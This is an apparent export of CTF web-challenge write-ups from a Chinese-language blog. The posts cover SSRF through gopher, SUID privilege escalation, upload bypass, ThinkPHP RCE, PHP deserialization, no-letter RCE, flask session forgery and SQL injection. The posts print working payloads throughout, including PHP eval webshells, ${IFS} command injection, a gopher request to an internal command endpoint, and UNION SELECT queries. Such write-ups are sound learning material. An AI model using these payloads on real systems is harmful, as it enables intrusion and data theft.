[{"title":"Goph3rrr","url":"/2025/03/18/Goph3rrr/","content":"from flask import Flask, request, send_file, render_template_string  import os  from urllib.parse import urlparse, urlunparse  import subprocess  import socket  import hashlib  import base64  import random    app = Flask(__name__)  BlackList = [      &quot;127.0.0.1&quot;  ]    @app.route(&#x27;/Login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])  def login():      junk_code()      if request.method == &#x27;POST&#x27;:          username = request.form.get(&#x27;username&#x27;)          password = request.form.get(&#x27;password&#x27;)          if username in users and users[username][&#x27;password&#x27;] == hashlib.md5(password.encode()).hexdigest():              return b64e(f&quot;Welcome back, &#123;username&#125;!&quot;)          return b64e(&quot;Invalid credentials!&quot;)      return render_template_string(&quot;&quot;&quot;          &lt;!DOCTYPE html&gt;        &lt;html lang=&quot;en&quot;&gt;        &lt;head&gt;            &lt;meta charset=&quot;UTF-8&quot;&gt;            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;            &lt;title&gt;Login&lt;/title&gt;            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;            &lt;style&gt;                body &#123;                    background-color: #f8f9fa;                &#125;                .container &#123;                    max-width: 400px;                    margin-top: 100px;                &#125;                .card &#123;                    border: none;                    border-radius: 10px;                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);                &#125;                .card-header &#123;                    background-color: #007bff;                    color: white;                    text-align: center;                    border-radius: 10px 10px 0 0;                &#125;                .btn-primary &#123;                    background-color: #007bff;                    border: none;                &#125;                .btn-primary:hover &#123;                    background-color: #0056b3;                &#125;            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;div class=&quot;container&quot;&gt;                &lt;div class=&quot;card&quot;&gt;                    &lt;div class=&quot;card-header&quot;&gt;                        &lt;h3&gt;Login&lt;/h3&gt;                    &lt;/div&gt;                    &lt;div class=&quot;card-body&quot;&gt;                        &lt;form method=&quot;POST&quot;&gt;                            &lt;div class=&quot;mb-3&quot;&gt;                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;                            &lt;/div&gt;                            &lt;div class=&quot;mb-3&quot;&gt;                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;                            &lt;/div&gt;                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;Login&lt;/button&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;)    @app.route(&#x27;/Gopher&#x27;)  def visit():      url = request.args.get(&#x27;url&#x27;)      if url is None:          return &quot;No url provided :)&quot;      url = urlparse(url)      realIpAddress = socket.gethostbyname(url.hostname)      if url.scheme == &quot;file&quot; or realIpAddress in BlackList:          return &quot;No (≧∇≦)&quot;      result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)      return result.stdout    @app.route(&#x27;/RRegister&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])  def register():      junk_code()      if request.method == &#x27;POST&#x27;:          username = request.form.get(&#x27;username&#x27;)          password = request.form.get(&#x27;password&#x27;)          if username in users:              return b64e(&quot;Username already exists!&quot;)          users[username] = &#123;&#x27;password&#x27;: hashlib.md5(password.encode()).hexdigest()&#125;          return b64e(&quot;Registration successful!&quot;)      return render_template_string(&quot;&quot;&quot; xxx &quot;&quot;&quot;)    @app.route(&#x27;/Manage&#x27;, methods=[&#x27;POST&#x27;])  def cmd():      if request.remote_addr != &quot;127.0.0.1&quot;:          return &quot;Forbidden!!!&quot;      if request.method == &quot;GET&quot;:          return &quot;Allowed!!!&quot;      if request.method == &quot;POST&quot;:          return os.popen(request.form.get(&quot;cmd&quot;)).read()    @app.route(&#x27;/Upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])  def upload_avatar():      junk_code()      if request.method == &#x27;POST&#x27;:          username = request.form.get(&#x27;username&#x27;)          if username not in users:              return b64e(&quot;User not found!&quot;)          file = request.files.get(&#x27;avatar&#x27;)          if file:              file.save(os.path.join(avatar_dir, f&quot;&#123;username&#125;.png&quot;))              return b64e(&quot;Avatar uploaded successfully!&quot;)          return b64e(&quot;No file uploaded!&quot;)      return render_template_string(&quot;&quot;&quot;  xxx &quot;&quot;&quot;)      @app.route(&#x27;/app.py&#x27;)  def download_source():      return send_file(__file__, as_attachment=True)    if __name__ == &#x27;__main__&#x27;:      app.run(host=&#x27;0.0.0.0&#x27;, port=8000)\n\n命令执行路由必须由本地访问\n@app.route(&#x27;/Manage&#x27;, methods=[&#x27;POST&#x27;])  def cmd():      if request.remote_addr != &quot;127.0.0.1&quot;:          return &quot;Forbidden!!!&quot;      if request.method == &quot;GET&quot;:          return &quot;Allowed!!!&quot;      if request.method == &quot;POST&quot;:          return os.popen(request.form.get(&quot;cmd&quot;)).read()  \n\n利用SSRF,请求/Manage路由,但是http:&#x2F;&#x2F;协议并不能携带POST参数,我们需要构造gopher请求\nGopher协议的URL以gopher://开头，使用简单的请求-响应模式\nGopher URL的标准结构如下：\ngopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;\n\n\n&lt;host&gt;: 目标服务器IP或域名\n&lt;port&gt;: 目标服务端口（默认70）\n&lt;gopher-path&gt;: 协议路径（包含请求数据编码）\n\n关键语法规则\n\n请求数据编码Gopher协议的  部分会被 原样转换为原始TCP数据流 发送给目标服务器，需按以下规则编写：\n\n换行符：必须使用 \\r\\n（即URL编码为%0D%0A）特殊字符：需进行URL编码（如空格→%20，问号→%3F）首字符：第一个字符表示资源类型（可忽略，通常用_或1占位）2. 数据流格式构造的Gopher请求本质是发送原始TCP数据流。\n_POST /Manage HTTP/1.1host:127.0.0.1Content-Type:application/x-www-form-urlencodedContent-Length:7cmd=env\n\n因为接受参数的时候就会解一次,编码一次到gopher:&#x2F;&#x2F;调用的时候就不是编码的了,所以必须url编码两次\n_POST%2520/Manage%2520HTTP/1.1%250D%250Ahost:127.0.0.1%250D%250AContent-Type:application/x-www-form-urlencoded%250D%250AContent-Length:7%250D%250A%250D%250Acmd=env\n\n加上gopher:&#x2F;&#x2F;127.0.0.2:8000&#x2F;\ngopher://127.0.0.2:8000/_POST%2520/Manage%2520HTTP/1.1%250D%250Ahost:127.0.0.1%250D%250AContent-Type:application/x-www-form-urlencoded%250D%250AContent-Length:7%250D%250A%250D%250Acmd=env\n\n\n","tags":["Gopher伪协议 ghctf2025"]},{"title":"Getshell","url":"/2025/03/17/Getshell/","content":"文件docker-entrypoint.sh#!/bin/sh   #声明user=$(ls /home)  #后来没用到，无实际意义if [ &quot;$DASFLAG&quot; ]; then    INSERT_FLAG=&quot;$DASFLAG&quot;    export DASFLAG=no_FLAG  # 导出修改后的环境变量    DASFLAG=no_FLAG         # 覆盖当前脚本中的变量值#export DASFLAG=no_FLAG：修改环境变量，让后续启动的程序（如 Apache）看到的是 no_FLAG，而非真实的 Flag。#DASFLAG=no_FLAG：修改当前脚本中变量 DASFLAG 的值，防止后续代码误用。#为什么需要双重操作（export + 直接赋值）？#export：修改环境变量，影响所有 子进程（比如后续启动的 Apache）。#直接赋值：修改当前脚本中的变量值，影响 当前进程。#区别：#如果只 export，当前脚本中 DASFLAG 的值还是真实的 Flag。#如果只直接赋值，子进程（如 Apache）仍然能读取到原始的 DASFLAG。#双重操作确保 当前脚本和子进程都看不到原始 Flag。elif [ &quot;$FLAG&quot; ]; then    INSERT_FLAG=&quot;$FLAG&quot;    export FLAG=no_FLAG    FLAG=no_FLAGelif [ &quot;$GZCTF_FLAG&quot; ]; then    INSERT_FLAG=&quot;$GZCTF_FLAG&quot;    export GZCTF_FLAG=no_FLAG    GZCTF_FLAG=no_FLAGelse    INSERT_FLAG=&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;fiecho $INSERT_FLAG | tee /flag  # 写入 Flag 到文件（/flag）chmod 700 /flag               # 权限设为仅所有者可读写执行exec apache2-foreground  #替换当前进程为 Apache 前台运行，保持容器活跃。\n\n 目的就是搜查三个环境变量，从环境变量中读取敏感信息（Flag），然后立即销毁环境变量中的flag痕迹，把真实flag存到&#x2F;flag中，但是需要所有者权限才能读取\n所以flag读不了考虑权限不够的原因，在url中提权 \n?action=run&amp;input=find$&#123;IFS&#125;/$&#123;IFS&#125;-perm$&#123;IFS&#125;-4000\n\n-perm 用于根据文件的权限来筛选文件，整句话的意思就是从根目录里头找具有SUID权限的文件（-4000）\n提权过程GTFOBins\n第一步：将带有SUID权限的wc复制到当前目录\n\n. 表示当前目录\n\n2.install 是一个用于复制文件并设置其权限的命令，常用于安装软件包时将文件复制到指定位置，并确保文件具有合适的权限，基本语法：\ninstall [选项] 源文件 目标位置\n\n\n-m&#x3D;xs（也就是install的那个选项）：\n\nm：mode（权限），用于指定文件的权限模式。\nxs：x 表示可执行权限，s 表示设置 SUID（SUID）或 SGID（Set Group ID）权限。在这个命令中，设置 SUID 权限意味着当其他用户执行这个文件时，它会以文件所有者的身份运行。\n4.$(which wc)：which 是一个用于查找可执行文件位置的命令。$(…)首先会执行括号里的命令，然后将命令结果输出到原来位置\nsudo install -m=xs $(which wc) .加工sudo$&#123;IFS&#125;install$&#123;IFS&#125;-m$&#123;IFS&#125;=xs$&#123;IFS&#125;$(which$&#123;IFS&#125;wc)$&#123;IFS&#125;.\n\n第二步：定义目标文件路径 定义环境变量LFILE，指向受保护文件&#x2F;flag，后续可以通过$LFILE引用该路径，避免直接硬编 \ninput=LFILE=/flag实际命令export LFILE=/flag\n\n 第三步：利用SUID的wc读取文件\n\n.&#x2F;wc：运行当前目录下已设置SUID的wc程序。\n\n–files0-from：wc的一个选项，从指定文件读取输入（通常用于批量统计文件）。\n\n\ninput=./wc --files0-from &quot;$LFILE&quot;加工input=./wc$&#123;IFS&#125;--files0-from$&#123;IFS&#125;&quot;$LFILE&quot;\n\n上面忽略，其实直接来到最后一步就行……\necho$&#123;IFS&#125;&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;$&#123;IFS&#125;&gt;1.php将&lt;?=eval($_POST[1]);?&gt;写入1.php\n\n在蚁剑终端输入\n/var/www/html/wc --files0-from &quot;/flag&quot; \n\n\n","tags":["suid提权 ghctf2025"]},{"title":"ez_ssrf","url":"/2025/03/27/HNCTF-2022-WEEK2-ez-ssrf/","content":" 应该是从index.php传参,ssrf然后访问到flag.php。\n 因此构造poc.php:\n&lt;?php$out = &quot;GET /flag.php HTTP/1.1\\r\\n&quot;;$out .= &quot;Host: 127.0.0.1\\r\\n&quot;;$out .= &quot;Connection: Close\\r\\n\\r\\n&quot;;echo base64_encode($out);?&gt;\n\n 得到data，host为127.0.0.1，port为80\n 传参：\n/index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=\n\n","tags":["ssrf 中间件攻击 post注入 HNCTF2022"]},{"title":"PermissionDenied","url":"/2025/03/18/PermissionDenied/","content":" &lt;?phpfunction blacklist($file)&#123;  $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;php1&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;pHp&quot;,&quot;pHp5&quot;,&quot;pHp4&quot;,&quot;pHp3&quot;,&quot;pHp2&quot;,&quot;pHp1&quot;,&quot;Html&quot;,&quot;Htm&quot;,&quot;pHtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;jSp&quot;,&quot;jSpx&quot;,&quot;jSpa&quot;,&quot;jSw&quot;,&quot;jSv&quot;,&quot;jSpf&quot;,&quot;jHtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;aSp&quot;,&quot;aSpx&quot;,&quot;aSa&quot;,&quot;aSax&quot;,&quot;aScx&quot;,&quot;aShx&quot;,&quot;aSmx&quot;,&quot;cEr&quot;,&quot;sWf&quot;,&quot;swf&quot;,&quot;ini&quot;);  $ext = pathinfo($file, PATHINFO_EXTENSION);  foreach ($deny_ext as $value) &#123;    if (stristr($ext, $value))&#123;      return false;    &#125;  &#125;  return true;&#125;if(isset($_FILES[&#x27;file&#x27;]))&#123;  $filename = urldecode($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);  $filecontent = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);  if(blacklist($filename))&#123;    file_put_contents($filename, $filecontent);    echo &quot;Success!!!&quot;;  &#125; else &#123;    echo &quot;Hacker!!!&quot;;  &#125;&#125; else&#123;  highlight_file(__FILE__);&#125;\n\n代码功能分析\n黑名单机制：blacklist 函数通过检查文件扩展名是否在 $deny_ext 数组中，阻止上传常见可执行文件（如 .php, .jsp, .asp 等）。\n文件上传逻辑：\n接收用户上传的文件。\n解码文件名（urldecode）。\n检查扩展名是否在黑名单中。\n如果通过检查，将文件保存到服务器。\n\n\n\n使用pycharm上传文件import requestsurl = &quot;http://node6.anna.nssctf.cn:22921/&quot;file = &#123;    &quot;file&quot;:(&quot;123.php%2f.&quot;,open(&#x27;1.php&#x27;,&#x27;r&#x27;))&#125;res = requests.post(url=url,files=file).textprint(res)\n\n或\nimport requestsurl = &quot;http://node6.anna.nssctf.cn:22921/&quot;file_content = &quot;&lt;?php eval($_POST[0]);phpinfo();?&gt;&quot;file = &#123;    &quot;file&quot;: (&quot;123.php%2f.&quot;, file_content)&#125;res = requests.post(url=url, files=file).textprint(res)\n\n当上传123.php/.的时候，file_put_contents函数会认为是要在123.php文件所在的目录下创建一个名为.的文件，最终上传创建的是123.php\n蚁剑链接，打开终端发现权限不足，使用插件绕过，再\nfind / -user root -perm -4000 -print\n\n找到suid权限文件&#x2F;usr&#x2F;local&#x2F;s3cRetTt\n提权.&#x2F;s3cRetTt cat &#x2F;flag\n","tags":["suid提权 文件上传 ghctf2024 request"]},{"title":"[SWPUCTF 2022 新生赛]ez_rce","url":"/2025/03/24/SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce/","content":" 页面什么都没有，扫目录，&#x2F;robots.txt,进入&#x2F;NSS&#x2F;index.php，看见是thinkphp，不会，看wp，借助payload-dumper-解包工具，得到payload，\n?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=aaa.php&amp;vars[1][]=&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n在当前目录下生成aaa.php\n蚁剑链接，flag里面是flag flag，回来看见nss，进去是ctf ctf，最后在&#x2F;nss&#x2F;ctf&#x2F;flag&#x2F;flag找到flag\n","tags":["thinkphp"]},{"title":"ez_1zpop","url":"/2025/03/18/ez-1zpop/","content":" &lt;?phperror_reporting(0);class dxg&#123;  function fmm()  &#123;   return &quot;nonono&quot;;  &#125;&#125;class lt&#123;  public $impo=&#x27;hi&#x27;;  public $md51=&#x27;weclome&#x27;;  public $md52=&#x27;to NSS&#x27;;  function __construct()  &#123;   $this-&gt;impo = new dxg;  &#125;  function __wakeup()  &#123;   $this-&gt;impo = new dxg;   return $this-&gt;impo-&gt;fmm();  &#125;  function __toString()  &#123;   if (isset($this-&gt;impo) &amp;&amp; md5($this-&gt;md51) == md5($this-&gt;md52) &amp;&amp; $this-&gt;md51 != $this-&gt;md52)     return $this-&gt;impo-&gt;fmm();  &#125;  function __destruct()  &#123;   echo $this;  &#125;&#125;class fin&#123;  public $a;  public $url = &#x27;https://www.ctfer.vip&#x27;;  public $title;  function fmm()  &#123;   $b = $this-&gt;a;   $b($this-&gt;title);  &#125;&#125;if (isset($_GET[&#x27;NSS&#x27;])) &#123;  $Data = unserialize($_GET[&#x27;NSS&#x27;]);&#125; else &#123;  highlight_file(__file__);&#125;\n\n&lt;?phperror_reporting(0);class dxg&#123;  function fmm()  &#123;   return &quot;nonono&quot;;  &#125;&#125;class lt&#123;  public $impo=&#x27;hi&#x27;;  public $md51=&#x27;weclome&#x27;;  public $md52=&#x27;to NSS&#x27;;  function __construct()  &#123;   $this-&gt;impo = new dxg;  &#125;  function __wakeup()  &#123;   $this-&gt;impo = new dxg;   return $this-&gt;impo-&gt;fmm();  &#125;  function __toString()  &#123;   if (isset($this-&gt;impo) &amp;&amp; md5($this-&gt;md51) == md5($this-&gt;md52) &amp;&amp; $this-&gt;md51 != $this-&gt;md52)​     return $this-&gt;impo-&gt;fmm();  &#125;  function __destruct()  &#123;   echo $this;  &#125;&#125;class fin&#123;  public $a;  public $url = &#x27;https://www.ctfer.vip&#x27;;  public $title;  function fmm()  &#123;   $b = $this-&gt;a;   $b($this-&gt;title);  &#125;&#125;$fin = new fin();$fin-&gt;a = &#x27;system&#x27;;$fin-&gt;title = &#x27;ls&#x27;; $lt = new lt();$lt-&gt;impo = $fin;$lt-&gt;md51 = &#x27;s214587387a&#x27;;$lt-&gt;md52 = &#x27;240610708&#x27;;echo serialize($lt);?&gt;\n\n?NSS=O:2:&quot;lt&quot;:4:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:3:&#123;s:1:&quot;a&quot;;s:4:&quot;eval&quot;;s:3:&quot;url&quot;;s:34:&quot;http://node5.anna.nssctf.cn:22535/&quot;;s:5:&quot;title&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;&#125;s:4:&quot;md51&quot;;s:7:&quot;QNKCDZO&quot;;s:4:&quot;md52&quot;;s:11:&quot;240610708&quot;;&#125;&quot;\n\n","tags":["反序列化 SWPUCTF 2022 新生赛"]},{"title":"ez_php","url":"/2025/03/22/ez-php/","content":" 强比较\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n\n伪协议读取level2.php源码（有bug，能直接读&#x2F;flag）\n&lt;?phperror_reporting(0);if (isset($_POST[&#x27;rce&#x27;])) &#123;    $rce = $_POST[&#x27;rce&#x27;];    if (strlen($rce) &lt;= 120) &#123;        if (is_string($rce)) &#123;            if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, $rce)) &#123;                eval($rce);            &#125; else &#123;                echo(&quot;Are you hack me?&quot;);            &#125;        &#125; else &#123;            echo &quot;I want string!&quot;;        &#125;    &#125; else &#123;        echo &quot;too long!&quot;;    &#125;&#125;?&gt;\n\n什么都被过滤完了，就自增\nrce=$_=[]._;$_3=$_[1];$_=$_[3];++$_;$_1=++$_;++$_;++$_;++$_;++$_;$_=$_1.++$_.$_3;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);再get传1，2两个参数，1=system&amp;2=ls /flag在根目录直接读取，1=system&amp;2=cat /flag\n\n得到flag\n","tags":["md5强比较 文件包含"]},{"title":"flask_session伪造","url":"/2025/02/27/flask-session%E4%BC%AA%E9%80%A0/","content":"flask_session伪造python3 session_encode.py encode -s &#x27;secret_key&#x27; -t &quot;&#123;内容&#125;&quot;\n\npython3 session_decode.py (session)\n\nsession伪造工具：https://github.com/noraj/flask-session-cookie-manager\n[CISCN2019 华东南赛区]Web41url参数返回了百度的页面 猜测存在任意文件读取，尝试读取文件&#x2F;etc&#x2F;passwd\n查看当前进程：&#x2F;proc&#x2F;self&#x2F;cmdline\n\n是python的后台，源码在app.py里面，尝试读取源码\nencoding:utf-8import re, random, uuid, urllibfrom flask import Flask, session, requestapp = Flask(__name__)random.seed(uuid.getnode())app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)app.debug = True@app.route(&#x27;/&#x27;)def index():    session[&#x27;username&#x27;] = &#x27;www-data&#x27;    return &#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;@app.route(&#x27;/read&#x27;)def read():    try:        url = request.args.get(&#x27;url&#x27;)        m = re.findall(&#x27;^file.*&#x27;, url, re.IGNORECASE)        n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)        if m or n:            return &#x27;No Hack&#x27;        res = urllib.urlopen(url)        return res.read()    except Exception as ex:        print str(ex)    return &#x27;no response&#x27;@app.route(&#x27;/flag&#x27;)def flag():    if session and session[&#x27;username&#x27;] == &#x27;fuck&#x27;:        return open(&#x27;/flag.txt&#x27;).read()    else:        return &#x27;Access denied&#x27;if __name__==&#x27;__main__&#x27;:    app.run(        debug=True,        host=&quot;0.0.0.0&quot;    )\n\nandom指定了seed那么生成的随机数是固定的\n\n&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 获得mac地址\nimport uuidimport randommac = &quot;e6:5c:db:61:4f:fb&quot;temp = mac.split(&#x27;:&#x27;)temp = [int(i,16) for i in temp]temp = [bin(i).replace(&#x27;0b&#x27;,&#x27;&#x27;).zfill(8) for i in temp]temp = &#x27;&#x27;.join(temp)mac = int(temp,2)random.seed(mac)randStr = str(random.random()*233)print(randStr)\n\npython3 session_decode.py eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48pCw.jSI45FJchx1e5pmIMuxPxvo4m9E&#123;&#x27;username&#x27;: b&#x27;www-data&#x27;&#125;\n\npython3 session_encode.py encode -s &#x27;204.939020002&#x27; -t &quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Z8AaaQ.PN1VAO71jMvkoNTMlg0JYHtYTV8\n\n传入eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Z8AaaQ.PN1VAO71jMvkoNTMlg0JYHtYTV8得flag\n[HCTF 2018]admin先注册一个账号aaa，得到\nsession=.eJw9kEGPgjAQhf_KZs4eoMrFxANJNVmTGVK30LQXg4hAATcBDVLjf9_GTTy_fN97M084XoZyrGF9G-7lAo7NGdZP-DrBGhIlnJFZS0xEhrcz9oeOmKm13dXEW4cs6xL5HZDrauxFSHzXGZUyo8QKrQ4SWay09JzcWeT7TssiQm4sMvEwsp2IpY54NWt37tBul6RMjzaeNcOH5yJjY6ddPGlZhZqJ0PAqJHbw3WJCee79vgBd5bntBl4LKMbhcrz9tuX1c4K2RaBdOhsrpkRtvSJriGFEViz9ZKflvklU5uvjJSqcydU1xZu3runzqvyYfmx2KKv_5Jr3PoA8z2EB97Ec3l-DMIDXH43ebGs.Z8AbCQ.IxiAnlonqkJOfwl9qXOTT_o8-v4\n\n解码为\n&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;9d3e5d7d9d922de7fab1a4933ee92479a2d541eee6ed8264978a9211c02ea7906c3d1e907e3482c7e2175ff202cc1a99f03c00a85cd5d857da44017f9d43875a&#x27;, &#x27;csrf_token&#x27;: b&#x27;b74c52f409a5d5b7c96472d3a2b9ee2071c278a4&#x27;, &#x27;image&#x27;: b&#x27;J5Qz&#x27;, &#x27;name&#x27;: &#x27;aaa&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;\n\n修改aaa为admin，在文件中找到secret_key为ckj123，编码\n.eJw9kEGLwjAQhf_KMmcPbbQXwUMhCivMlLixIbmItrVt2rhQldqI_32DC54f3_fezBMO56G6NrC8DfdqBoe2hOUTvk6whEwJb2TeEROJ4d2EbtcTM422m4Z455HlfSa_I_J9g07ExDe9UXtmlFig1VEmi4WWgZMbi3zba1kkyI1FJh5GdiOxvSdeT9qXPdr1nJRxaNNJM3wELjE29dqno5Z1rJmIDa9jYrvQLUaUpQv7IvR14NYreM2guA7nw-23qy6fE7QtIu33k7FizNQ6KPKWGCZkxTxM9lpu20zloT6do8KJfNNQunrrWnesq4_px-a7qv5PLkcXAjiWrr3ADO7Xanj_DeIIXn9tx21R.Z8Abxg.LkGVETvcR5s0IX3YFx0FXKI5hoY\n\n主页替换session，得到flag\n"},{"title":"light_pink","url":"/2025/03/22/light-pink/","content":" 先找到闭合，查数据库\n0&#x27;union select 1,2,3,database(),5&#x27;\n\n得到nss_board,接着查表\n0&#x27;union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema like database()),4,5&#x27;\n\n得到Cute,messages，然后查列\n0&#x27;union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema like database()),4,5&#x27;\n\n得到id,Happy,id,username,title,content,created_at，再查字段\n0&#x27;union select 1,2,(select group_concat(Happy) from Cute),4,5&#x27;\n\n","tags":["sql"]},{"title":"Hello World","url":"/2025/02/22/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"my blog","url":"/2025/03/02/my-blog/","content":" 没有特别的信息，看一下robots.txt,进入level1.php，file_get_contents()从文件中提取字符串，需要使用data:&#x2F;&#x2F;text&#x2F;plain传入welcome to nssctf，file不能直接flag，但提示了level2.php，file&#x3D;level2.php，得到\n121.91.174.161:2368地址是你刘队博客，一定有网站有他的博客地址吧不是一个正确的url\n\n我进入刘队博客到处点了很久不知道下一步该干什么，再看”不是一个正确的url”，于是打开burp爆端口，没有效果，被提示抓level2.php源码，file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;level2.php得到\nif (isset($_GET[&#x27;url&#x27;]) &amp;&amp; preg_match(&#x27;/^http:\\/\\/www.baidu.com/&#x27;, $_GET[&#x27;url&#x27;])) &#123;    $content = @file_get_contents($url);    if ($content !== false &amp;&amp; strpos($content, &#x27;121.91.174.161:2368&#x27;) !== false) &#123;        if (isset($_GET[&#x27;cmd&#x27;])&amp;&amp;(!preg_match(&#x27;/[a-zA-Z;&amp;|`]/&#x27;, $cmd))) &#123;            system($cmd);        &#125; else &#123;            die(&quot;最后的绕过了&quot;);        &#125;    &#125; else &#123;        die(&quot;什么网站里会有刘队博客地址呢&quot;);    &#125;&#125; else &#123;    die(&quot;不是一个正确的url&quot;);&#125;\n\nurl传入百度网址要跟上121.91.174.161:2368，\nhttp://www.baidu.com@121.91.174.161:2368\n\n接着是system命令，eval会解析取反异或等形式的命令，system不会，搜索找到$&#39;\\xxx&#39;可以将八进制ascii码解析为字符，是特性，下载项目构建ls &#x2F;和cat &#x2F;flag，($’\\154\\163’ $’\\57’)($’\\143\\141\\164’ $’\\57\\146\\154\\141\\147’)\n/level2.php?url=http://www.baidu.com@121.91.174.161:2368&amp;cmd=$&#x27;\\143\\141\\164&#x27; $&#x27;\\57\\146\\154\\141\\147&#x27;\n\n","tags":["ssrf,无字母绕过"]},{"title":"php特性","url":"/2025/02/27/php%E7%89%B9%E6%80%A7/","content":"[NSS内部训练赛 Week1]了解过PHP特性吗\n[[NSS内部训练赛 Week1]了解过PHP特性吗&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;rce.php&quot;);$checker_1 = FALSE;$checker_2 = FALSE;$checker_3 = FALSE;$checker_4 = FALSE;$num = $_GET[&#x27;num&#x27;];if (preg_match(&quot;/[0-9]/&quot;, $num)) &#123;    die(&quot;no!!&quot;);&#125;if (intval($num)) &#123;    $checker_1 = TRUE;&#125;//非空数组num[]=1会被preg_match判定为0，被intval判定为1if (isset($_POST[&#x27;ctype&#x27;]) &amp;&amp; isset($_POST[&#x27;is_num&#x27;])) &#123;    $ctype = strrev($_POST[&#x27;ctype&#x27;]);    $is_num = strrev($_POST[&#x27;is_num&#x27;]);    if (ctype_alpha($ctype) &amp;&amp; is_numeric($is_num) &amp;&amp; md5($ctype) == md5($is_num)) &#123;        $checker_2 = TRUE;    &#125;&#125;//strrev()反转，ctype_alpha()全字母,is_numeric()全数字$_114 = $_GET[&#x27;114&#x27;];$_514 = $_POST[&#x27;514&#x27;];if (isset($_114) &amp;&amp; intval($_114) &gt; 114514 &amp;&amp; strlen($_114) &lt;= 3) &#123;    if (!is_numeric($_514) &amp;&amp; $_514 &gt; 9999999) &#123;        $checker_3 = TRUE;    &#125;&#125;//is_numeric()从左到右识别，截至无法识别，100000000a判定为100000000$arr4y = $_POST[&#x27;arr4y&#x27;];if (is_array($arr4y)) &#123;    for ($i = 0; $i &lt; count($arr4y); $i++) &#123;        if ($arr4y[$i] === &quot;NSS&quot;) &#123;            die(&quot;no!&quot;);        &#125;        $arr4y[$i] = intval($arr4y[$i]);    &#125;    if 